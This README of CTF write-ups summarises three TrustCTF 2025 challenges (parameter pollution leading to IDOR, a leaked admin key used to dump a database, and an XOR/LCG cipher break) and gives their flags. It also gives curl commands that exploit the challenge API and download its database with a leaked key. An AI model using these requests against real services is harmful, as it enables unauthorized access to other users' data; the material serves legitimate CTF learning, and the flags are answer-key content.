# TrustCTF 2025 - Challenge Write-ups (IIT Bombay)

This repository contains concise write-ups for three challenges solved during **TrustCTF 2025 (IIT Bombay)**: API Security, Data Privacy, and a Cryptanalysis challenge. Full explanations, proofs-of-concept, and screenshots are included in the attached PDF.

---

## 🔍 Challenge Highlights

### 1. API Security- HTTP Parameter Pollution → IDOR
A parameter-parsing mismatch in `GET /api/balance` allowed HTTP Parameter Pollution, resulting in an IDOR that leaked the admin balance and flag.  
**Flag:** `trustctf{1n53cur3_0bj3c7_r3f3r3nc3_f7w}`

### 2. Data Privacy — Leaked Secret Key → DB Dump → HMAC Flag
A leaked `ADMIN_API_KEY` enabled downloading the runtime database. Analyzing the DB led to deriving the HMAC-based final flag.  
**Flag:** `trustctf{aefefb18de55}`

### 3. Cryptanalysis - XOR + LCG Stream Cipher Break
Recovered the keystream using known plaintext, solved LCG parameters (`A = 0x49`, `C = 0x97`), and decrypted the final message.  
**Flag:** `trustktf{y0u_d0nt_3v3n_n33d_2_b_sm4rt_4_th15}`

---

## 🧪 Reproduction (PoC Commands)

### 1. Register & Login
curl -s -X POST https://tlctf2025-api.chals.io/api/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"akhter","password":"hunter2"}'

curl -s -X POST https://tlctf2025-api.chals.io/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"akhter","password":"hunter2"}'
### Response: {"token":"<TOKEN>"}
2. Exploit Parameter-Parsing Mismatch
curl -s "https://tlctf2025-api.chals.io/api/balance?username=akhter&username=admin" \
  -H "Authorization: Bearer <TOKEN>"
### Returns admin balance + flag
3. Download DB Using Leaked Admin Key
curl -s -o runtime_db.csv \
 "https://tlctf2025-data-app.chals.io/download_db?api_key=6208d4e88be3d7a2c6845189a23954420f037a262d13a833b9ace3ef98a35ee0"
